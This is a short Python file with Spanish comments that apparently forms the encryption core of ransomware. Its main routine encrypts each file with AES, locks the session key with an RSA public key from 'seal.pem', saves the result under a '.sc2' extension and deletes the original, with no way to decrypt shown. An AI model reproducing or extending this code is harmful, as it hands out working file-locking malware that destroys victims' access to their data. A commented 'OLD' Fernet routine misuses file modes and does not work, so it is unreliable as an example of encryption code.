from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import os

ruta_inicio = os.path.expanduser("~")
ruta = os.path.join(ruta_inicio,"key.key")

# =====================================OLD=================================
# EL USO DE FERNET GENERA UNA ENTROPIA DEMASIADO BAJA
def old_encrypt(f):
    # GENERA UN LLAVE Y LA GUARDA EN EL ARCHIVO KEY.KEY
    key = Fernet.generate_key()
    with open(ruta,'rb') as filekey:
        filekey.write(key)
    # ENCRIPTA EL ARCHIVO CON LA LLAVE GENERADA
    fer = Fernet(key)
    with open(f,'wb') as file:
        original = file.read()
        file.close()
    with open(f,'wb') as file:
        file.write(fer.encrypt(original))

def replace_file(file):
    os.rename(file,file+'.sc2')
# ======================================OLD==================================

def encrypt(f):
    with open(f,"rb") as file:
        data = file.read()

    recipient_key = RSA.import_key(open("seal.pem").read())
    session_key = get_random_bytes(16)

    # Encrypt the session key with the public RSA key
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    # Encrypt the data with the AES session key
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)
    
    with open(f+".sc2", "wb") as file:
        file.write(enc_session_key)
        file.write(cipher_aes.nonce)
        file.write(tag)
        file.write(ciphertext)
        print(f + " encriptado")
    os.remove(f)
def main(file):
    encrypt(file)
    #replace_file(file)
